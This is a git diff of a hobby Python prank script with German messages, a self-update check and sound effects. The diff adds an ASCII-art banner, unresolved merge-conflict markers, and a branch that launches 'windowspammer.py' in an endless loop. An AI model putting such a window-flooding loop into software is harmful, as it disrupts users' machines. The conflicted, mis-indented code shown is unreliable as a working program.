@@ -5,10 +5,22 @@ from playsound import playsound
 from time import sleep
 import os
 
+<<<<<<< HEAD
 
 def check_for_updates():
     # Change the repository URL to your own repository
     repository_url = "https://github.com/Uglypr1nces/chatbot_proto.git"
+=======
+ascii_art = """
+W   W  III  L      L           K   K  OOO  M     M  EEEEE  N     N
+W   W   I   L      L           K  K   O   O MM   MM  E      NN    N
+W W W   I   L      L           KKK    O   O M M M M  EEEE   N N   N
+W W W   I   L      L           K  K   O   O M  M  M  E      N  N  N
+ W W   III  LLLLL  LLLLL  LLLLL K   K  OOO  M     M  EEEEE  N   N N
+"""
+
+a = 1
+>>>>>>> c7ab42ae52ce6e66196cdfe0f9deb28fb8d328a7
 
     # Get the current version of the script
     current_version = subprocess.check_output(["git", "rev-parse", "HEAD"]).decode().strip()
@@ -87,5 +99,14 @@ if __name__ == "__main__":
                 subprocess.run(["python", "windowspammer.py"])
                 
     else:
+<<<<<<< HEAD
         print("einbisschen zu früh nicht?")
         playsound('htmlpages/sounds/gameover.wav')
+=======
+        while True:
+            subprocess.run(["python", "windowspammer.py"])
+            
+else:
+    print("einbisschen zu früh nicht?")
+    playsound('htmlpages/sounds/gameover.wav')
+>>>>>>> c7ab42ae52ce6e66196cdfe0f9deb28fb8d328a7
